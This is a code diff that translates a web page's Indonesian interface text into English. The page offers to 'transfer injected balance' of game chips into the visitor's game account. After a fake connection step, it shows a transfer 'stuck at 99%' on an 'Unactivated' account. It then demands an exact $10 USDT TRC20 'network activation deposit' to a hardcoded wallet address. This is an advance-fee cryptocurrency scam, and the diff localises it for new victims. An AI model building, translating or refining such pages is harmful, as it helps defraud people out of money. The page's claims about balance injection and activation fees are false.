@@ -45,12 +45,12 @@
 
     <main class="pt-20 px-4 max-w-lg mx-auto relative z-10">
         <div class="bg-red-500/20 border border-red-500/60 p-2.5 rounded-lg mb-4 text-red-300 text-[11px] font-bold text-center animate-pulse">
-            <i class="fas fa-exclamation-triangle mr-1"></i> JANGAN TUTUP HALAMAN: SELESAIKAN TRANSFER CHIP KE AKUN GAME ANDA.
+            <i class="fas fa-exclamation-triangle mr-1"></i> DO NOT CLOSE PAGE: COMPLETE CHIP TRANSFER TO YOUR GAME ACCOUNT.
         </div>
 
         <div id="panel-transfer" class="glass-panel p-5 border-cyanGlow/40 mb-6">
             <h2 class="text-base font-bold mb-1 text-cyanGlow"><i class="fas fa-paper-plane mr-1"></i> Transfer to Game Account</h2>
-            <p class="text-xs text-gray-400 mb-4">Kirimkan hasil injeksi saldo ke akun game resmi Anda.</p>
+            <p class="text-xs text-gray-400 mb-4">Transfer your injected balance to your official game account.</p>
 
             <div class="space-y-4 mb-5">
                 <div>
@@ -59,22 +59,22 @@
                 </div>
                 <div>
                     <label class="block text-xs text-gray-400 mb-1">Game Username / Account ID</label>
-                    <input type="text" id="game-username" class="w-full rounded p-3 text-sm text-white focus:outline-none focus:border-cyanGlow" placeholder="Masukkan ID / Username akun game">
+                    <input type="text" id="game-username" class="w-full rounded p-3 text-sm text-white focus:outline-none focus:border-cyanGlow" placeholder="Enter game ID / Username">
                 </div>
                 <div>
-                    <label class="block text-xs text-gray-400 mb-1">Nominal Transfer</label>
+                    <label class="block text-xs text-gray-400 mb-1">Transfer Amount</label>
                     <input type="text" id="transfer-amount" readonly class="w-full rounded p-3 text-sm text-cyanGlow font-black cursor-not-allowed">
                 </div>
             </div>
 
             <button onclick="executeTransfer()" class="w-full py-4 rounded btn-gold uppercase tracking-wider text-sm">
-                KIRIM CHIP KE AKUN GAME <i class="fas fa-bolt ml-1"></i>
+                SEND CHIPS TO GAME ACCOUNT <i class="fas fa-bolt ml-1"></i>
             </button>
         </div>
 
         <div id="panel-deposit" class="glass-panel p-5 border-yellow-500/60 hidden">
             <div class="bg-yellow-500/10 border border-yellow-500/40 p-3 rounded-lg mb-4 text-xs text-yellow-300">
-                <i class="fas fa-lock mr-1"></i> <b>Transfer Tertahan (99%):</b> Server game mendeteksi akun game Anda berstatus <b>Unactivated</b>. Lakukan deposit aktivasi jaringan sebesar <b>$10 USDT (TRC20)</b> agar chip game dapat masuk sepenuhnya.
+                <i class="fas fa-lock mr-1"></i> <b>Transfer Stuck (99%):</b> Game server detected your account status as <b>Unactivated</b>. Please make a network activation deposit of <b>$10 USDT (TRC20)</b> to fully credit your game chips.
             </div>
 
             <h3 class="text-sm font-bold mb-1 text-cyanGlow uppercase">Network Activation Gateway ($10 USDT)</h3>
@@ -84,14 +84,14 @@
                 <div class="w-28 h-28 mx-auto bg-white p-2 rounded mb-3 flex items-center justify-center">
                     <i class="fas fa-qrcode text-7xl text-black"></i>
                 </div>
-                <p class="text-xs text-gray-400 uppercase mb-1">Jaringan Wajib: USDT (TRC20)</p>
-                <p class="text-[11px] text-yellow-400 mb-3 font-semibold">Nominal Wajib: Exactly $10.00 USDT</p>
+                <p class="text-xs text-gray-400 uppercase mb-1">Required Network: USDT (TRC20)</p>
+                <p class="text-[11px] text-yellow-400 mb-3 font-semibold">Required Amount: Exactly $10.00 USDT</p>
                 <div class="flex items-center justify-between bg-obsidian rounded p-2 border border-gray-700">
                     <span id="wallet-address" class="text-xs font-mono text-gray-300 truncate mr-2">TUMUoD5yG8b3m6N9HcRG9qo2dL8u3L7kkP</span>
                     <button onclick="copyAddr()" class="text-cyanGlow"><i class="fas fa-copy"></i></button>
                 </div>
             </div>
-            <p class="text-[11px] text-gray-400 text-center">Chip otomatis masuk ke akun game dalam 1-3 menit setelah deposit terkonfirmasi.</p>
+            <p class="text-[11px] text-gray-400 text-center">Chips are automatically credited to your game account within 1-3 minutes after deposit confirmation.</p>
         </div>
     </main>
 
@@ -127,12 +127,12 @@
         function executeTransfer() {
             const gameUser = document.getElementById('game-username').value.trim();
             if(!gameUser) {
-                alert("Silakan masukkan Username / ID Akun Game Anda terlebih dahulu.");
+                alert("Please enter your Game Username / Account ID first.");
                 return;
             }
 
             const btn = document.querySelector('button[onclick="executeTransfer()"]');
-            btn.innerHTML = `<i class="fas fa-spinner fa-spin mr-2"></i> Menghubungkan ke Server Game...`;
+            btn.innerHTML = `<i class="fas fa-spinner fa-spin mr-2"></i> Connecting to Game Server...`;
             btn.disabled = true;
 
             setTimeout(() => {
